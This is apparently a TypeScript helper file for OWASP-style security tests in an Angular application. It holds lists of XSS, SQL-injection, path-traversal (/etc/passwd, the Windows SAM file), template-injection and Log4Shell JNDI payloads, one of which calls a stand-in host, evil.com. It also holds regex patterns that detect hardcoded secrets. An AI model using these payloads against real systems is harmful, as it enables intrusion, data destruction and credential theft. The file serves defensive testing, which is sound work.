/**
 * Security Testing Utilities for OWASP Top 10 Compliance
 *
 * Provides utilities and helper functions for comprehensive security testing
 * of the ZTMM Assessment application.
 */

import { ComponentFixture } from '@angular/core/testing';
import { DebugElement } from '@angular/core';
import { By } from '@angular/platform-browser';

export interface SecurityTestConfig {
  enableXSSDetection: boolean;
  enableInjectionDetection: boolean;
  enableCSPValidation: boolean;
  enableAccessControlTests: boolean;
}

export class SecurityTestUtils {

  private static readonly XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '"><script>alert(document.cookie)</script>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>'
  ];

  private static readonly INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "1; DELETE FROM table_name; --",
    "UNION SELECT * FROM information_schema.tables",
    "1' UNION SELECT NULL, version(), NULL--",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "${7*7}"
  ];

  private static readonly DANGEROUS_PATTERNS = [
    /password\s*[:=]\s*['"]/i,
    /secret\s*[:=]\s*['"]/i,
    /token\s*[:=]\s*['"]/i,
    /key\s*[:=]\s*['"]/i,
    /api[_-]?key\s*[:=]\s*['"]/i,
    /access[_-]?token\s*[:=]\s*['"]/i
  ];

  /**
   * Tests component for XSS vulnerabilities
   */
  static testXSSProtection(fixture: ComponentFixture<any>, inputSelectors: string[]): SecurityTestResult {
    const results: SecurityTestResult = {
      passed: true,
      vulnerabilities: [],
      testType: 'XSS Protection'
    };

    inputSelectors.forEach(selector => {
      const inputElement = fixture.debugElement.query(By.css(selector));
      if (!inputElement) {
        results.vulnerabilities.push({
          type: 'XSS',
          severity: 'LOW',
          description: `Input element not found: ${selector}`,
          location: selector
        });
        return;
      }

      this.XSS_PAYLOADS.forEach(payload => {
        try {
          // Set the malicious value
          inputElement.nativeElement.value = payload;
          inputElement.nativeElement.dispatchEvent(new Event('input'));
          fixture.detectChanges();

          // Check if the payload was executed or properly escaped
          const domContent = fixture.nativeElement.innerHTML;

          if (domContent.includes('<script>') && !domContent.includes('&lt;script&gt;')) {
            results.passed = false;
            results.vulnerabilities.push({
              type: 'XSS',
              severity: 'HIGH',
              description: `Unescaped script tag found in DOM for input: ${selector}`,
              location: selector,
              payload: payload
            });
          }

          if (domContent.includes('javascript:') && !domContent.includes('javascript%3A')) {
            results.passed = false;
            results.vulnerabilities.push({
              type: 'XSS',
              severity: 'HIGH',
              description: `JavaScript URL scheme not sanitized for input: ${selector}`,
              location: selector,
              payload: payload
            });
          }

        } catch (error) {
          // If error is thrown, it might indicate improper error handling
          results.vulnerabilities.push({
            type: 'XSS',
            severity: 'MEDIUM',
            description: `Error during XSS test for ${selector}: ${error}`,
            location: selector,
            payload: payload
          });
        }
      });
    });

    return results;
  }

  /**
   * Tests component for injection vulnerabilities
   */
  static testInjectionProtection(component: any, methods: string[]): SecurityTestResult {
    const results: SecurityTestResult = {
      passed: true,
      vulnerabilities: [],
      testType: 'Injection Protection'
    };

    methods.forEach(methodName => {
      if (typeof component[methodName] !== 'function') {
        return;
      }

      this.INJECTION_PAYLOADS.forEach(payload => {
        try {
          // Test method with malicious payload
          const result = component[methodName](payload);

          // If the method returns a promise, handle it
          if (result instanceof Promise) {
            result.catch((error) => {
              // Check if error reveals system information
              if (error.message.includes('SQL') || error.message.includes('database')) {
                results.passed = false;
                results.vulnerabilities.push({
                  type: 'INJECTION',
                  severity: 'HIGH',
                  description: `SQL error information leaked in ${methodName}`,
                  location: methodName,
                  payload: payload
                });
              }
            });
          }

        } catch (error) {
          // Check if error reveals sensitive system information
          const errorMessage = error instanceof Error ? error.message : String(error);
          if (errorMessage.includes('SQL') || errorMessage.includes('database') ||
              errorMessage.includes('ORA-') || errorMessage.includes('MySQL')) {
            results.passed = false;
            results.vulnerabilities.push({
              type: 'INJECTION',
              severity: 'HIGH',
              description: `Database error information leaked in ${methodName}`,
              location: methodName,
              payload: payload
            });
          }
        }
      });
    });

    return results;
  }

  /**
   * Tests for Content Security Policy compliance
   */
  static testCSPCompliance(fixture: ComponentFixture<any>): SecurityTestResult {
    const results: SecurityTestResult = {
      passed: true,
      vulnerabilities: [],
      testType: 'CSP Compliance'
    };

    const element = fixture.nativeElement;

    // Check for inline event handlers
    const inlineEventHandlers = [
      'onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur',
      'onsubmit', 'onchange', 'onkeydown', 'onkeyup', 'onmousedown', 'onmouseup'
    ];

    inlineEventHandlers.forEach(handler => {
      const elements = element.querySelectorAll(`[${handler}]`);
      if (elements.length > 0) {
        results.passed = false;
        results.vulnerabilities.push({
          type: 'CSP_VIOLATION',
          severity: 'MEDIUM',
          description: `Inline event handler '${handler}' found`,
          location: `${elements.length} element(s) with ${handler}`
        });
      }
    });

    // Check for inline styles
    const inlineStyles = element.querySelectorAll('[style]');
    if (inlineStyles.length > 0) {
      results.vulnerabilities.push({
        type: 'CSP_VIOLATION',
        severity: 'LOW',
        description: 'Inline styles found (potential CSP violation)',
        location: `${inlineStyles.length} element(s) with inline styles`
      });
    }

    // Check for javascript: URLs
    const javascriptUrls = element.querySelectorAll('[href^="javascript:"], [src^="javascript:"]');
    if (javascriptUrls.length > 0) {
      results.passed = false;
      results.vulnerabilities.push({
        type: 'CSP_VIOLATION',
        severity: 'HIGH',
        description: 'JavaScript URLs found (CSP violation)',
        location: `${javascriptUrls.length} element(s) with javascript: URLs`
      });
    }

    return results;
  }

  /**
   * Tests for hardcoded secrets or credentials
   */
  static testForHardcodedSecrets(component: any): SecurityTestResult {
    const results: SecurityTestResult = {
      passed: true,
      vulnerabilities: [],
      testType: 'Hardcoded Secrets Detection'
    };

    const componentString = component.toString();

    this.DANGEROUS_PATTERNS.forEach(pattern => {
      const matches = componentString.match(pattern);
      if (matches) {
        results.passed = false;
        results.vulnerabilities.push({
          type: 'HARDCODED_SECRET',
          severity: 'HIGH',
          description: `Potential hardcoded credential found: ${matches[0]}`,
          location: 'Component source code'
        });
      }
    });

    // Check component properties for secrets
    Object.keys(component).forEach(key => {
      const lowerKey = key.toLowerCase();
      if (lowerKey.includes('password') || lowerKey.includes('secret') ||
          lowerKey.includes('token') || lowerKey.includes('key')) {
        const value = component[key];
        if (typeof value === 'string' && value.length > 0) {
          results.vulnerabilities.push({
            type: 'HARDCODED_SECRET',
            severity: 'MEDIUM',
            description: `Potential sensitive property: ${key}`,
            location: `Component property: ${key}`
          });
        }
      }
    });

    return results;
  }

  /**
   * Tests for proper error handling without information disclosure
   */
  static testErrorHandling(component: any, errorTriggerMethods: string[]): SecurityTestResult {
    const results: SecurityTestResult = {
      passed: true,
      vulnerabilities: [],
      testType: 'Error Handling'
    };

    const originalConsoleError = console.error;
    const originalConsoleLog = console.log;
    const loggedMessages: string[] = [];

    // Mock console to capture error messages
    console.error = (...args: any[]) => {
      loggedMessages.push(args.join(' '));
    };
    console.log = (...args: any[]) => {
      loggedMessages.push(args.join(' '));
    };

    try {
      errorTriggerMethods.forEach(methodName => {
        if (typeof component[methodName] === 'function') {
          try {
            component[methodName]();
          } catch (error) {
            const errorMessage = error instanceof Error ? error.message : String(error);

            // Check if error exposes sensitive information
            if (errorMessage.includes('password') || errorMessage.includes('secret') ||
                errorMessage.includes('token') || errorMessage.includes('database') ||
                errorMessage.includes('file://') || errorMessage.includes('C:\\')) {
              results.passed = false;
              results.vulnerabilities.push({
                type: 'INFORMATION_DISCLOSURE',
                severity: 'HIGH',
                description: `Sensitive information in error message from ${methodName}`,
                location: methodName
              });
            }
          }
        }
      });

      // Check logged messages for sensitive information
      loggedMessages.forEach(message => {
        if (message.includes('password') || message.includes('secret') ||
            message.includes('token') || message.includes('database')) {
          results.passed = false;
          results.vulnerabilities.push({
            type: 'INFORMATION_DISCLOSURE',
            severity: 'MEDIUM',
            description: 'Sensitive information in console logs',
            location: 'Console output'
          });
        }
      });

    } finally {
      // Restore original console methods
      console.error = originalConsoleError;
      console.log = originalConsoleLog;
    }

    return results;
  }

  /**
   * Tests for proper access control
   */
  static testAccessControl(component: any, restrictedMethods: string[]): SecurityTestResult {
    const results: SecurityTestResult = {
      passed: true,
      vulnerabilities: [],
      testType: 'Access Control'
    };

    restrictedMethods.forEach(methodName => {
      if (typeof component[methodName] === 'function') {
        try {
          // Try to call method without proper setup/authorization
          const result = component[methodName]();

          // If method executes without validation, it might be a security issue
          if (result !== undefined && result !== null) {
            results.vulnerabilities.push({
              type: 'ACCESS_CONTROL',
              severity: 'MEDIUM',
              description: `Method ${methodName} may lack proper access control`,
              location: methodName
            });
          }
        } catch (error) {
          // If method throws an error, that's often good (proper validation)
          // But we should check the error doesn't reveal sensitive information
          const errorMessage = error instanceof Error ? error.message : String(error);
          if (errorMessage.includes('password') || errorMessage.includes('unauthorized')) {
            results.vulnerabilities.push({
              type: 'INFORMATION_DISCLOSURE',
              severity: 'LOW',
              description: `Access control error may reveal information in ${methodName}`,
              location: methodName
            });
          }
        }
      }
    });

    return results;
  }

  /**
   * Generates a comprehensive security report
   */
  static generateSecurityReport(testResults: SecurityTestResult[]): SecurityReport {
    const report: SecurityReport = {
      timestamp: new Date().toISOString(),
      overallResult: 'PASS',
      totalTests: testResults.length,
      passedTests: 0,
      failedTests: 0,
      vulnerabilities: [],
      summary: {
        HIGH: 0,
        MEDIUM: 0,
        LOW: 0
      }
    };

    testResults.forEach(result => {
      if (result.passed) {
        report.passedTests++;
      } else {
        report.failedTests++;
        report.overallResult = 'FAIL';
      }

      result.vulnerabilities.forEach(vuln => {
        report.vulnerabilities.push(vuln);
        report.summary[vuln.severity]++;
      });
    });

    return report;
  }

  /**
   * Common XSS payloads for testing
   */
  static getXSSPayloads(): string[] {
    return [...this.XSS_PAYLOADS];
  }

  /**
   * Common injection payloads for testing
   */
  static getInjectionPayloads(): string[] {
    return [...this.INJECTION_PAYLOADS];
  }
}

export interface SecurityTestResult {
  passed: boolean;
  vulnerabilities: SecurityVulnerability[];
  testType: string;
}

export interface SecurityVulnerability {
  type: 'XSS' | 'INJECTION' | 'CSP_VIOLATION' | 'HARDCODED_SECRET' | 'INFORMATION_DISCLOSURE' | 'ACCESS_CONTROL';
  severity: 'HIGH' | 'MEDIUM' | 'LOW';
  description: string;
  location: string;
  payload?: string;
}

export interface SecurityReport {
  timestamp: string;
  overallResult: 'PASS' | 'FAIL';
  totalTests: number;
  passedTests: number;
  failedTests: number;
  vulnerabilities: SecurityVulnerability[];
  summary: {
    HIGH: number;
    MEDIUM: number;
    LOW: number;
  };
}
